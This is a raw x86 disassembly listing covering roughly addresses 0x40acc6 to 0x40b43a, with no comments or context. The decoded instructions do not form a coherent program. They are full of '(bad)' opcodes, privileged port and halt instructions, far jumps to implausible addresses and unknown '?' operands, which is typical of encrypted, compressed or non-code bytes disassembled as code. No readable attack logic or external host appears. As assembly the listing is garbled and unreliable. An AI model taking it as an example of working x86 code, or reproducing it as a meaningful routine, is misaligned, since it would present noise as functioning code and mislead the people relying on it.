  40acc6:	repz test DWORD PTR [esi-0x46],esp
  40acca:	push   edx
  40accb:	(bad)  
  40accc:	mov    esi,0xa2faea89
  40acd1:	push   es
  40acd2:	jne    0x40acfd
  40acd4:	sub    edx,DWORD PTR [ecx-0x26]
  40acd7:	fimul  WORD PTR [ebx-0x6bb7e809]
  40acdd:	test   BYTE PTR [ebp-0x1e571084],dl
  40ace3:	je     0x40acc6
  40ace5:	xchg   ebp,eax
  40ace6:	int    0x51
  40ace8:	jo     0x40ad11
  40acea:	ret    0xa73c
  40aced:	popf   
  40acee:	xchg   ebx,eax
  40acef:	std    
  40acf0:	push   es
  40acf1:	sbb    al,0x19
  40acf3:	int3   
  40acf4:	push   edx
  40acf5:	dec    esi
  40acf6:	fs jbe 0x40ac85
  40acf9:	add    DWORD PTR [bp+0x42],esp
  40acfd:	push   edi
  40acfe:	popf   
  40acff:	inc    edx
  40ad00:	cld    
  40ad01:	arpl   WORD PTR [esi+eiz*1-0x66],bx
  40ad05:	cmc    
  40ad06:	xor    eax,0xf9097c03
  40ad0b:	sub    bl,dh
  40ad0d:	xchg   ebp,eax
  40ad0e:	repnz test al,0x9
  40ad11:	test   eax,0xb6819256
  40ad16:	pop    ecx
  40ad17:	js     0x40ad78
  40ad19:	jge    0x40ad73
  40ad1b:	cmp    eax,0xfc4f7285
  40ad20:	into   
  40ad21:	lods   al,BYTE PTR ds:[esi]
  40ad22:	loope  0x40ad70
  40ad24:	imul   BYTE PTR [eax+ebx*4+0x57cd4fe2]
  40ad2b:	mov    ebx,0xc00b7920
  40ad30:	sbb    edx,DWORD PTR [ecx+eax*4-0x7c]
  40ad34:	add    bh,al
  40ad36:	adc    BYTE PTR [edi+0x418a2dfe],dh
  40ad3c:	das    
  40ad3d:	xchg   esi,eax
  40ad3e:	mov    ebx,0xe569f4e6
  40ad43:	pusha  
  40ad44:	mov    ch,0x57
  40ad46:	ret    
  40ad47:	push   cs
  40ad48:	ret    
  40ad49:	retf   0x875c
  40ad4c:	xchg   ebp,eax
  40ad4d:	pop    DWORD PTR [edi+0x6eed8e78]
  40ad53:	popa   
  40ad54:	sti    
  40ad55:	mov    DWORD PTR [eax],ebp
  40ad57:	mov    ebx,?
  40ad59:	scas   eax,DWORD PTR es:[edi]
  40ad5a:	fist   WORD PTR [ebx]
  40ad5c:	sti    
  40ad5d:	or     al,0xd8
  40ad5f:	outs   dx,DWORD PTR ds:[esi]
  40ad60:	push   esp
  40ad61:	imul   esp,DWORD PTR [esi+0x5c47e88d],0xee13d386
  40ad6b:	out    0x3,eax
  40ad6d:	sub    DWORD PTR [eax],edi
  40ad6f:	cs mov edx,0x351733b4
  40ad75:	les    eax,FWORD PTR [edx]
  40ad77:	fsub   QWORD PTR [ecx-0xef87ea1]
  40ad7d:	or     DWORD PTR [edi+eiz*1-0x588a40c1],edx
  40ad84:	and    BYTE PTR [ebx],bl
  40ad86:	popf   
  40ad87:	neg    BYTE PTR [eax+edi*8]
  40ad8a:	inc    ebx
  40ad8b:	in     al,0xf6
  40ad8d:	mov    dl,cl
  40ad8f:	cdq    
  40ad90:	aaa    
  40ad91:	mov    bh,0x35
  40ad93:	(bad)  
  40ad94:	dec    ebp
  40ad95:	adc    DWORD PTR [eax],0x8fa5cabc
  40ad9b:	(bad)  
  40ad9c:	mov    ds,WORD PTR [edx]
  40ad9e:	loopne 0x40adef
  40ada0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ada1:	and    cl,BYTE PTR [edi+0x17]
  40ada4:	cld    
  40ada5:	cmp    al,0xe9
  40ada7:	gs dec edi
  40ada9:	nop
  40adaa:	bt     DWORD PTR [edi-0x16],ebp
  40adae:	fiadd  WORD PTR [edi]
  40adb0:	bound  ebp,QWORD PTR [edx+ebx*1+0x641f7c78]
  40adb7:	mov    bl,0x48
  40adb9:	loop   0x40ae0f
  40adbb:	xor    eax,0x556147f0
  40adc0:	loop   0x40adef
  40adc2:	shr    BYTE PTR [esi+edi*2+0x1f121705],cl
  40adc9:	icebp  
  40adca:	add    BYTE PTR [esi+ecx*2+0x3109b77c],ah
  40add1:	cmp    DWORD PTR [eax+0x5e],eax
  40add4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add5:	rol    BYTE PTR [ebx+0x3e0e4b0],cl
  40addb:	lds    ebp,FWORD PTR [esi]
  40addd:	push   ecx
  40adde:	test   eax,0xb5a68afc
  40ade3:	ds icebp 
  40ade5:	ja     0x40ad70
  40ade7:	aam    0x72
  40ade9:	jnp    0x40ae47
  40adeb:	pop    ecx
  40adec:	push   eax
  40aded:	rcr    dl,cl
  40adef:	ror    BYTE PTR [edx+0x492f7e38],0x77
  40adf6:	adc    al,0xd8
  40adf8:	(bad)  
  40adf9:	repz daa 
  40adfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adfc:	std    
  40adfd:	sub    DWORD PTR [esi-0x17c05623],esp
  40ae03:	sub    BYTE PTR [ebp+0x23],bl
  40ae06:	in     al,0x5f
  40ae08:	jl     0x40ae01
  40ae0a:	lock mov ch,BYTE PTR [ecx]
  40ae0d:	jbe    0x40addb
  40ae0f:	mov    cl,0x3d
  40ae11:	bound  ebp,QWORD PTR [ebx+0x75a49cd2]
  40ae17:	push   esp
  40ae18:	xchg   esi,eax
  40ae19:	jge    0x40ae8c
  40ae1b:	add    eax,0x875d38e9
  40ae20:	sub    al,0x29
  40ae22:	or     al,BYTE PTR [eax+0x37]
  40ae25:	retf   0xdad
  40ae28:	or     esp,DWORD PTR [ebx+0x61c1262e]
  40ae2e:	lock pusha 
  40ae30:	mov    ecx,0x77f34545
  40ae35:	fnstsw WORD PTR [eax-0x1e58475a]
  40ae3b:	cwde   
  40ae3c:	cli    
  40ae3d:	dec    ecx
  40ae3e:	cdq    
  40ae3f:	nop
  40ae40:	sbb    al,0xf0
  40ae42:	jp     0x40adca
  40ae44:	pop    eax
  40ae45:	push   ebp
  40ae46:	out    dx,eax
  40ae47:	add    eax,0x7fd94302
  40ae4c:	mov    dh,0x6c
  40ae4e:	inc    ecx
  40ae4f:	fmul   DWORD PTR [esp+ebx*1-0x278a3d95]
  40ae56:	popa   
  40ae57:	leave  
  40ae58:	jmp    0x40ae89
  40ae5a:	clc    
  40ae5b:	inc    eax
  40ae5c:	mov    esi,0xc4eaadc
  40ae61:	mov    edi,0xfeeea874
  40ae66:	lock adc cl,BYTE PTR [edx]
  40ae69:	out    0xc1,al
  40ae6b:	stos   DWORD PTR es:[edi],eax
  40ae6c:	das    
  40ae6d:	cmp    al,0xaa
  40ae6f:	fld    TBYTE PTR [esi+0x73]
  40ae72:	repz add BYTE PTR [ebx],ah
  40ae75:	sub    DWORD PTR [ebp-0x17c0077e],edx
  40ae7b:	dec    edi
  40ae7c:	sti    
  40ae7d:	pop    edx
  40ae7e:	aad    0xb0
  40ae80:	push   ebx
  40ae81:	add    eax,0x671edd3f
  40ae86:	je     0x40aebc
  40ae88:	(bad)
  40ae8d:	aaa    
  40ae8e:	leave  
  40ae8f:	retf   0x1654
  40ae92:	aaa    
  40ae93:	xor    DWORD PTR [ebx],edx
  40ae95:	test   BYTE PTR [ecx+0x4383b466],bl
  40ae9b:	enter  0x210a,0x69
  40ae9f:	inc    ebp
  40aea0:	and    eax,DWORD PTR ds:0x61ab824c
  40aea6:	shr    bh,cl
  40aea8:	cli    
  40aea9:	es add eax,0x34411b83
  40aeaf:	push   edi
  40aeb0:	aas    
  40aeb1:	mov    ah,0x40
  40aeb3:	adc    eax,0x3e16c1c6
  40aeb8:	je     0x40af36
  40aeba:	(bad)  [edx+0x73270cb2]
  40aec0:	pop    ecx
  40aec1:	xlat   BYTE PTR ds:[ebx]
  40aec2:	xchg   ecx,eax
  40aec3:	cli    
  40aec4:	fcom   QWORD PTR [eax+ebx*4-0x2ff9e7b7]
  40aecb:	jmp    0x40ae59
  40aecd:	call   0xb6e6c331
  40aed2:	jnp    0x40ae59
  40aed4:	dec    edx
  40aed5:	es xor eax,0x74666403
  40aedb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aedc:	pop    ecx
  40aedd:	jno    0x40aea2
  40aedf:	dec    ebp
  40aee0:	xchg   ebp,eax
  40aee1:	dec    ebp
  40aee2:	in     al,dx
  40aee3:	ret    
  40aee4:	dec    ebx
  40aee5:	iret   
  40aee6:	iret   
  40aee7:	loop   0x40aec1
  40aee9:	xchg   DWORD PTR [ebp-0x46],ecx
  40aeec:	jl     0x40ae83
  40aeee:	push   ds
  40aeef:	mov    ch,0xae
  40aef1:	sub    ebx,eax
  40aef3:	retf   
  40aef4:	nop
  40aef5:	icebp  
  40aef6:	xchg   DWORD PTR [ebx+0x703d336e],eax
  40aefc:	pop    ebp
  40aefd:	cld    
  40aefe:	and    cl,bh
  40af00:	mov    esi,0xa4415421
  40af05:	loop   0x40af23
  40af07:	jbe    0x40ae8f
  40af09:	test   al,0xdb
  40af0b:	add    DWORD PTR [esp+edx*1+0x22],ebp
  40af0f:	mov    esp,?
  40af11:	cld    
  40af12:	je     0x40af00
  40af14:	shr    BYTE PTR [edi],1
  40af16:	xchg   edx,ebp
  40af18:	leave  
  40af19:	push   0x229609ba
  40af1e:	jecxz  0x40af1f
  40af20:	shl    BYTE PTR [edi-0x79b7d42c],1
  40af26:	xor    al,0x82
  40af28:	push   ebp
  40af29:	repz hlt 
  40af2b:	mov    cl,0xb7
  40af2d:	push   ebx
  40af2e:	sbb    eax,0x84ccb184
  40af33:	ins    BYTE PTR es:[edi],dx
  40af34:	(bad)  
  40af35:	test   al,0xd4
  40af37:	std    
  40af38:	mov    ebx,0x87a1c161
  40af3d:	mov    eax,ds:0xbaa6ad9a
  40af42:	repnz data16 sbb BYTE PTR [ebx],bl
  40af46:	cwde   
  40af47:	(bad)  
  40af48:	std    
  40af49:	call   0x7089:0x36731441
  40af50:	cs adc al,0xe5
  40af54:	inc    eax
  40af55:	pop    ebp
  40af56:	sub    BYTE PTR [edx+0x44],cl
  40af59:	in     eax,dx
  40af5a:	pop    ds
  40af5b:	pop    esi
  40af5c:	or     al,0x8e
  40af5e:	mul    BYTE PTR [ecx+edi*1-0x3]
  40af62:	xchg   BYTE PTR [ecx],bh
  40af64:	push   esp
  40af65:	sbb    eax,0x622241a1
  40af6a:	and    eax,0x61b17984
  40af6f:	xchg   ecx,eax
  40af70:	jmp    0xedbbdcb2
  40af75:	ret    
  40af76:	outs   dx,BYTE PTR ds:[esi]
  40af77:	xchg   ecx,eax
  40af78:	jmp    0x9ab321f3
  40af7d:	pusha  
  40af7e:	pushw  cs
  40af80:	push   esi
  40af81:	mov    ebx,0x2d6e03d3
  40af86:	jp     0x40af3b
  40af88:	shl    DWORD PTR [esi-0x1db1f5c7],1
  40af8e:	jl     0x40afa3
  40af90:	jle    0x40af14
  40af92:	push   DWORD PTR [ebx+0x72d4b388]
  40af98:	mov    bh,0x41
  40af9a:	stc    
  40af9b:	out    0x97,eax
  40af9d:	outs   dx,DWORD PTR ds:[esi]
  40af9e:	jg     0x40afad
  40afa0:	sub    BYTE PTR [ecx+edi*8],cl
  40afa3:	fdivr  QWORD PTR [edi]
  40afa5:	pop    esp
  40afa6:	gs or  al,0x64
  40afa9:	adc    BYTE PTR [bx+di],cl
  40afac:	xlat   BYTE PTR ds:[ebx]
  40afad:	sub    eax,0x2f22e732
  40afb2:	mov    ch,0x40
  40afb4:	adc    dl,BYTE PTR [esi]
  40afb6:	sub    cl,dl
  40afb8:	xor    esp,0xfffffff5
  40afbb:	sahf   
  40afbc:	jle    0x40af86
  40afbe:	inc    edx
  40afbf:	ja     0x40af8f
  40afc1:	dec    esi
  40afc2:	int    0x5a
  40afc4:	jnp    0x40b03b
  40afc6:	mov    dh,0xf7
  40afc8:	loope  0x40b046
  40afca:	jno    0x40afba
  40afcc:	(bad)  
  40afcd:	xchg   esi,eax
  40afce:	or     BYTE PTR [esi-0x7077ff1d],dl
  40afd4:	test   al,0xb2
  40afd6:	add    BYTE PTR [ebp-0x42ed3598],dl
  40afdc:	das    
  40afdd:	cs xchg esp,eax
  40afdf:	sub    dl,dh
  40afe1:	adc    eax,0xfa65db9
  40afe6:	jne    0x40b060
  40afe8:	cmp    al,BYTE PTR [esi]
  40afea:	push   edx
  40afeb:	leave  
  40afec:	leave  
  40afed:	bound  esp,QWORD PTR [edi]
  40afef:	ror    DWORD PTR [ebx],cl
  40aff1:	dec    ecx
  40aff2:	xor    ebx,DWORD PTR [ebp+0x2a]
  40aff5:	daa    
  40aff6:	lods   al,BYTE PTR ds:[esi]
  40aff7:	pop    ebx
  40aff8:	frstor [eax+0x34]
  40affb:	rol    DWORD PTR [ebp-0x74],1
  40affe:	icebp  
  40afff:	ds jno 0x40affb
  40b002:	loop   0x40afa2
  40b004:	hlt    
  40b005:	mov    DWORD PTR [edi-0x25095c59],esp
  40b00b:	jge    0x40afb0
  40b00d:	and    bl,BYTE PTR [ebx]
  40b00f:	cmp    eax,DWORD PTR [esi-0x5b]
  40b012:	xor    eax,0xff9436d
  40b017:	mov    eax,0xd39ab975
  40b01c:	cmp    esp,ebp
  40b01e:	aad    0x56
  40b020:	jb     0x40afdc
  40b022:	push   0xafe2c95
  40b027:	add    eax,0xe8935eac
  40b02c:	fcmovnbe st,st(7)
  40b02e:	mov    edi,0x8c3ef30
  40b033:	ins    DWORD PTR es:[edi],dx
  40b034:	in     al,dx
  40b035:	mov    esp,DWORD PTR [ebx+0x64]
  40b038:	(bad)  
  40b039:	es pop esi
  40b03b:	xchg   esi,eax
  40b03c:	out    0x30,al
  40b03e:	aad    0x55
  40b040:	mov    eax,0x90f8d2e0
  40b045:	sahf   
  40b046:	stc    
  40b047:	jg     0x40b090
  40b049:	push   0x626c5cb1
  40b04e:	(bad)  
  40b04f:	or     BYTE PTR [esi],cl
  40b051:	add    BYTE PTR [esi+0xfb7f29e],ah
  40b057:	dec    edi
  40b058:	sub    ebx,0xffffffd5
  40b05b:	jb     0x40b01c
  40b05d:	fdivr  QWORD PTR [eax+eax*1+0x3b640fbc]
  40b064:	xchg   BYTE PTR [eax+eax*8-0x2e],ah
  40b068:	in     eax,0x46
  40b06a:	sbb    bl,BYTE PTR [ebx+esi*1+0x73c96b58]
  40b071:	pop    es
  40b072:	xlat   BYTE PTR ds:[ebx]
  40b073:	dec    ebx
  40b074:	call   0x96a8:0xb49c85c8
  40b07b:	mov    bl,BYTE PTR [edi-0x56]
  40b07e:	and    al,0x84
  40b080:	xchg   ebx,eax
  40b081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b082:	ins    BYTE PTR es:[edi],dx
  40b083:	in     eax,dx
  40b084:	pop    eax
  40b085:	ret    0xf7e7
  40b088:	dec    esi
  40b089:	cmp    DWORD PTR fs:[edx],edx
  40b08c:	mov    eax,edi
  40b08e:	lods   al,BYTE PTR ds:[esi]
  40b08f:	jae    0x40b096
  40b091:	test   DWORD PTR [edi+0x71],ecx
  40b094:	mov    dh,ah
  40b096:	sbb    DWORD PTR [ebx-0x52a01340],edx
  40b09c:	pop    DWORD PTR [esi-0x3d]
  40b09f:	xchg   esi,eax
  40b0a0:	push   0x8a8dbc4c
  40b0a5:	out    0xc5,eax
  40b0a7:	cld    
  40b0a8:	dec    ebp
  40b0a9:	adc    DWORD PTR [ecx],ecx
  40b0ab:	shr    BYTE PTR ds:0xef58413e,cl
  40b0b1:	popa   
  40b0b2:	test   DWORD PTR [ebx],edi
  40b0b4:	in     eax,0x4
  40b0b6:	sahf   
  40b0b7:	inc    esp
  40b0b8:	cdq    
  40b0b9:	push   esp
  40b0ba:	sar    DWORD PTR [ebx-0x51],cl
  40b0bd:	and    BYTE PTR [edx+0x2b511bc9],0xd4
  40b0c4:	aam    0xe8
  40b0c6:	and    edx,edi
  40b0c8:	in     al,0x16
  40b0ca:	sub    BYTE PTR [ebx+0x5b],al
  40b0cd:	ror    DWORD PTR [edx],cl
  40b0cf:	dec    ebp
  40b0d0:	lea    edi,[ebx+0x33ee7ad8]
  40b0d6:	sbb    esi,DWORD PTR ds:0x6939e367
  40b0dc:	ret    0x5563
  40b0df:	das    
  40b0e0:	mov    eax,ds:0x2d96c915
  40b0e5:	xor    al,BYTE PTR [ebx+0xfa5233f]
  40b0eb:	pop    ecx
  40b0ec:	mov    bh,0x9c
  40b0ee:	addr16 mov ds:0x44b8,eax
  40b0f2:	ret    0x8c79
  40b0f5:	bound  esi,QWORD PTR [eax+0x39893f53]
  40b0fb:	fld    TBYTE PTR [edx+0x64]
  40b0fe:	push   0x7794853
  40b103:	dec    ebp
  40b104:	scas   eax,DWORD PTR es:[edi]
  40b105:	in     al,0xec
  40b107:	leave  
  40b108:	and    eax,0x8257ccbf
  40b10d:	xor    al,0xbc
  40b10f:	imul   ebp,DWORD PTR [ebp-0x50],0x52
  40b113:	dec    edx
  40b114:	in     al,dx
  40b115:	jmp    0x90443270
  40b11a:	repz xor ebx,DWORD PTR [esi+0x10]
  40b11e:	leave  
  40b11f:	ins    BYTE PTR es:[edi],dx
  40b120:	inc    edx
  40b121:	push   0xb90bedfa
  40b126:	(bad)  
  40b128:	mov    ecx,eax
  40b12a:	push   es
  40b12b:	sbb    ch,BYTE PTR [ecx-0x60081cfd]
  40b131:	xor    bl,BYTE PTR [esi]
  40b133:	push   ebp
  40b134:	addr16 test bh,al
  40b137:	cmp    BYTE PTR [ecx+0x280d5368],bl
  40b13d:	mov    edx,0x9988734c
  40b142:	ds mov ecx,0xc6e91097
  40b148:	push   0x5c70c867
  40b14d:	in     eax,0xc8
  40b14f:	and    al,0x11
  40b151:	out    0x73,al
  40b153:	fs mov esp,0x306bb43d
  40b159:	aam    0x81
  40b15b:	add    al,0xb1
  40b15d:	and    esp,esp
  40b15f:	add    eax,0xbb8859e8
  40b164:	inc    esi
  40b165:	mov    esi,0xe737d616
  40b16a:	push   ds
  40b16b:	mov    bl,BYTE PTR [edi]
  40b16d:	stc    
  40b16e:	mov    dl,0x6
  40b170:	outs   dx,BYTE PTR ds:[esi]
  40b171:	mov    cl,0x53
  40b173:	enter  0xe74,0xfb
  40b177:	test   DWORD PTR [esi],0x44027117
  40b17d:	imul   esi,esi,0x39
  40b180:	or     eax,DWORD PTR [ecx+0x51]
  40b183:	loop   0x40b147
  40b185:	mov    ds:0xfa3bf375,al
  40b18a:	xchg   esp,eax
  40b18b:	push   edx
  40b18c:	xor    BYTE PTR [ecx+0x3b],ah
  40b18f:	pop    edi
  40b190:	fiadd  WORD PTR [esi+ecx*4]
  40b193:	jno    0x40b1e0
  40b195:	adc    ebp,DWORD PTR ds:[edx]
  40b198:	xchg   esp,eax
  40b199:	stos   BYTE PTR es:[edi],al
  40b19a:	xor    al,0xad
  40b19c:	shl    DWORD PTR [edi+0x66afbcf7],1
  40b1a2:	dec    eax
  40b1a3:	mov    edi,0xa1858d11
  40b1a8:	in     eax,dx
  40b1a9:	dec    eax
  40b1aa:	add    edi,ecx
  40b1ac:	push   eax
  40b1ad:	or     ch,BYTE PTR ds:0xcbb00d02
  40b1b3:	mov    eax,ds:0x45cc10e5
  40b1b8:	fdivr  DWORD PTR [ebp-0x38a38b1c]
  40b1be:	jmp    0x3673411a
  40b1c3:	cmp    al,0x5d
  40b1c5:	sub    BYTE PTR gs:[eax+0x72b2dd93],al
  40b1cc:	jmp    0x78909358
  40b1d1:	imul   esi,DWORD PTR [edi-0x39],0x2b
  40b1d5:	sub    eax,0x498a273
  40b1da:	inc    ecx
  40b1db:	jb     0x40b1b1
  40b1dd:	sbb    eax,0xcede87c3
  40b1e2:	in     al,dx
  40b1e3:	je     0x40b1ad
  40b1e5:	adc    al,0x9a
  40b1e7:	sti    
  40b1e8:	pop    eax
  40b1e9:	aaa    
  40b1ea:	pop    eax
  40b1eb:	icebp  
  40b1ec:	pop    ss
  40b1ed:	jecxz  0x40b1bb
  40b1ef:	jns    0x40b1b7
  40b1f1:	adc    BYTE PTR [edi+0x7b],cl
  40b1f4:	push   ecx
  40b1f5:	ins    DWORD PTR es:[edi],dx
  40b1f6:	mov    ds:0xcee0005c,eax
  40b1fb:	aaa    
  40b1fc:	in     eax,0xca
  40b1fe:	xchg   DWORD PTR [ecx+edx*8],ebx
  40b201:	jge    0x40b22a
  40b203:	add    dh,BYTE PTR [ebx-0x2ecf6cd5]
  40b209:	ja     0x40b1f3
  40b20b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b20c:	cli    
  40b20d:	lods   al,BYTE PTR ds:[esi]
  40b20e:	add    al,0x77
  40b210:	outs   dx,DWORD PTR ds:[esi]
  40b211:	jno    0x40b1df
  40b213:	mov    bh,0x46
  40b215:	(bad)  
  40b216:	pushf  
  40b217:	push   edi
  40b218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b219:	cwde   
  40b21a:	or     ebp,0xe8953f6f
  40b220:	inc    edi
  40b221:	stos   DWORD PTR es:[edi],eax
  40b222:	and    DWORD PTR [eax-0x7cd8b805],edx
  40b228:	jbe    0x40b23d
  40b22a:	inc    esi
  40b22b:	mov    fs,WORD PTR [edx-0x3738a613]
  40b231:	iret   
  40b232:	cld    
  40b233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b234:	sahf   
  40b235:	lods   eax,DWORD PTR ds:[esi]
  40b236:	xor    eax,0x7fdb25d7
  40b23b:	push   ebx
  40b23c:	popa   
  40b23d:	xchg   BYTE PTR [edx],bl
  40b23f:	cmp    al,0x1
  40b241:	add    DWORD PTR [ecx-0xcd3fd1a],edx
  40b247:	xchg   esp,eax
  40b248:	or     eax,0xa9c3ae93
  40b24d:	xchg   edx,eax
  40b24e:	add    BYTE PTR [edi],dh
  40b250:	push   ebp
  40b251:	cli    
  40b252:	inc    edi
  40b253:	in     al,0x59
  40b255:	in     eax,0x77
  40b257:	sub    eax,esp
  40b259:	push   edx
  40b25a:	gs cli 
  40b25c:	add    al,BYTE PTR [ebx-0x54419b54]
  40b262:	dec    esp
  40b263:	aam    0x4
  40b265:	jno    0x40b2b0
  40b267:	jno    0x40b24b
  40b269:	ror    BYTE PTR [ebx-0x5b],1
  40b26c:	xchg   DWORD PTR [edi+edi*4+0x62],edi
  40b270:	cwde   
  40b271:	xor    BYTE PTR [eax+0x3986b776],cl
  40b277:	fisttp QWORD PTR [ebx]
  40b279:	add    al,0x95
  40b27b:	jg     0x40b28d
  40b27d:	mov    eax,0x2ae30fad
  40b282:	jae    0x40b2d5
  40b284:	xchg   edi,eax
  40b285:	mov    dh,bh
  40b287:	ins    DWORD PTR es:[edi],dx
  40b288:	xchg   bl,bh
  40b28a:	aas    
  40b28b:	out    0xad,eax
  40b28d:	shl    DWORD PTR [ebx],cl
  40b28f:	in     al,dx
  40b290:	loope  0x40b305
  40b292:	mov    edi,0x1acd0cd3
  40b297:	xchg   edx,eax
  40b298:	xlat   BYTE PTR ds:[ebx]
  40b299:	es cs jecxz 0x40b319
  40b29d:	mov    bh,0x34
  40b29f:	int3   
  40b2a0:	dec    DWORD PTR [ebp-0x610abc1f]
  40b2a6:	fist   DWORD PTR [ebx-0x80]
  40b2a9:	dec    ecx
  40b2aa:	add    eax,0x473c3c29
  40b2af:	test   ebp,ebx
  40b2b1:	ss push edi
  40b2b3:	in     eax,dx
  40b2b4:	jmp    0x40b2ce
  40b2b6:	dec    ebp
  40b2b7:	jae    0x40b317
  40b2b9:	fisttp DWORD PTR [eax+0x33]
  40b2bc:	adc    al,bl
  40b2be:	in     al,0x1d
  40b2c0:	adc    DWORD PTR [ecx],ebx
  40b2c2:	mov    dl,0xfb
  40b2c4:	push   ebp
  40b2c5:	call   0x13e6158f
  40b2ca:	fs pusha 
  40b2cc:	jge    0x40b28d
  40b2ce:	adc    bh,dl
  40b2d0:	fstp   DWORD PTR [edx-0x17]
  40b2d3:	ins    DWORD PTR es:[edi],dx
  40b2d4:	adc    al,ch
  40b2d6:	pop    ecx
  40b2d7:	sub    eax,0xe8d14b33
  40b2dc:	push   es
  40b2dd:	cwde   
  40b2de:	sub    ch,BYTE PTR [ebx]
  40b2e0:	js     0x40b298
  40b2e2:	mov    dh,0x55
  40b2e4:	lds    ecx,FWORD PTR [esi-0x7cfa6c39]
  40b2ea:	or     edx,DWORD PTR [ecx-0x46]
  40b2ed:	adc    al,0x5f
  40b2ef:	popf   
  40b2f0:	test   BYTE PTR [edx-0x51802d50],0x9b
  40b2f7:	pop    eax
  40b2f8:	je     0x40b336
  40b2fa:	push   0x3c
  40b2fc:	sbb    eax,0x51d457c1
  40b301:	gs jge 0x40b35c
  40b304:	outs   dx,BYTE PTR ds:[esi]
  40b305:	stos   BYTE PTR es:[edi],al
  40b306:	stc    
  40b307:	inc    esp
  40b308:	test   DWORD PTR [edx-0x4e],edi
  40b30b:	push   ss
  40b30c:	jmp    0x40b36a
  40b30e:	scas   al,BYTE PTR es:[edi]
  40b30f:	jno    0x40b314
  40b311:	inc    ebx
  40b312:	mov    cl,0xdb
  40b314:	mov    ds:0x92b4a71b,al
  40b319:	push   ecx
  40b31a:	das    
  40b31b:	jae    0x40b314
  40b31d:	js     0x40b364
  40b31f:	mov    al,ds:0x15fc9228
  40b324:	retf   0x75e
  40b327:	cmp    ebx,ebp
  40b329:	adc    esi,DWORD PTR [edi-0x20]
  40b32c:	ds nop
  40b32e:	mov    ah,0x3c
  40b330:	mov    ss,WORD PTR [ebx+eiz*8+0x70]
  40b334:	jns    0x40b386
  40b336:	adc    DWORD PTR [ebp+ebx*1+0x56],ecx
  40b33a:	push   es
  40b33b:	pop    ss
  40b33c:	xor    al,0xe2
  40b33e:	cmp    bh,BYTE PTR [eax-0x17]
  40b341:	gs push cs
  40b343:	shl    WORD PTR [edi],1
  40b346:	sub    al,0x23
  40b348:	jae    0x40b320
  40b34a:	stos   BYTE PTR es:[edi],al
  40b34b:	call   FWORD PTR ds:0x90ca651f
  40b351:	mov    dh,0xd6
  40b353:	outs   dx,BYTE PTR ds:[esi]
  40b354:	mov    BYTE PTR [bx-0x73aa],dl
  40b359:	sti    
  40b35a:	xor    al,0x86
  40b35c:	xor    BYTE PTR [ecx+0x20],dh
  40b35f:	mov    esi,0x310a9f5
  40b364:	leave  
  40b365:	repz mov ?,esi
  40b368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b369:	sub    bh,BYTE PTR [ebp-0x59]
  40b36c:	getsec 
  40b36e:	in     eax,0xef
  40b370:	xlat   BYTE PTR ds:[ebx]
  40b371:	iret   
  40b372:	inc    esi
  40b373:	out    0xdb,eax
  40b375:	cwde   
  40b376:	div    ecx
  40b378:	add    al,0xff
  40b37a:	jg     0x40b350
  40b37c:	call   0x5c3e0a4e
  40b381:	addr16 std 
  40b383:	test   BYTE PTR [ebx+0x62],bl
  40b386:	sbb    BYTE PTR [eax-0x4cfbc2c4],ch
  40b38c:	mov    ah,0x33
  40b38e:	ss push ss
  40b390:	cmp    dl,dl
  40b392:	ror    BYTE PTR [eax+esi*4-0x4],1
  40b396:	mov    eax,0xd0521e42
  40b39b:	in     eax,0xef
  40b39d:	test   BYTE PTR [esi+edi*1+0x161b9dfc],ch
  40b3a4:	jg     0x40b362
  40b3a6:	rol    BYTE PTR [edx],0xa7
  40b3a9:	jp     0x40b423
  40b3ab:	fdivr  QWORD PTR [ebp-0x6b]
  40b3ae:	cmp    ecx,eax
  40b3b0:	ret    0x1736
  40b3b3:	pop    ebx
  40b3b4:	pop    esp
  40b3b5:	movq   QWORD PTR [eax-0x43],mm5
  40b3b9:	ins    DWORD PTR es:[edi],dx
  40b3ba:	lods   eax,DWORD PTR ds:[esi]
  40b3bb:	fdivr  DWORD PTR [ecx+edi*8]
  40b3be:	jmp    0x7067:0x7bd1099b
  40b3c5:	mov    bh,0x96
  40b3c7:	rol    BYTE PTR [di],cl
  40b3ca:	sbb    BYTE PTR [ecx+0x7b],0x37
  40b3ce:	sbb    DWORD PTR [edi-0x2e184b6c],edi
  40b3d4:	lea    ebx,[ebx]
  40b3d6:	mov    ?,WORD PTR [esi]
  40b3d8:	es jo  0x40b3cb
  40b3db:	and    DWORD PTR [ebx+0x16b6f58e],edx
  40b3e1:	in     al,dx
  40b3e2:	popa   
  40b3e3:	mov    bh,0xa0
  40b3e5:	xlat   BYTE PTR ds:[ebx]
  40b3e6:	rcr    BYTE PTR [esi+0x4],1
  40b3e9:	in     eax,dx
  40b3ea:	mov    ebp,0x36e24fab
  40b3ef:	test   DWORD PTR ds:0x98d27f62,ebx
  40b3f5:	jl     0x40b444
  40b3f7:	xor    DWORD PTR [ebp+0x57],esi
  40b3fa:	sahf   
  40b3fb:	gs push edx
  40b3fd:	cmp    cl,bh
  40b3ff:	fisub  WORD PTR [edx]
  40b401:	enter  0x7fb9,0xd9
  40b405:	ret    0x9576
  40b408:	ins    BYTE PTR es:[edi],dx
  40b409:	cmp    ebx,DWORD PTR [eax-0x23]
  40b40c:	or     dl,BYTE PTR [ebp+0x3c4df20f]
  40b412:	stos   DWORD PTR es:[edi],eax
  40b413:	fsubr  st,st(6)
  40b415:	xchg   edi,eax
  40b416:	inc    ecx
  40b417:	je     0x40b403
  40b419:	sub    eax,ebx
  40b41b:	aam    0x3c
  40b41d:	jl     0x40b3a2
  40b41f:	(bad)  
  40b421:	icebp  
  40b422:	xchg   BYTE PTR [ebx],bh
  40b424:	xchg   ecx,eax
  40b425:	sbb    al,0xf7
  40b427:	adc    BYTE PTR [edi],al
  40b429:	mov    esp,0x5b3776db
  40b42e:	mov    al,0x70
  40b430:	mov    cl,0xc2
  40b432:	lods   eax,DWORD PTR ds:[esi]
  40b433:	mov    bh,0x6b
  40b435:	xchg   ebp,eax
  40b436:	pop    esi
  40b437:	add    ecx,ebx
  40b439:	fwait
  40b43a:	jle    0x40b469
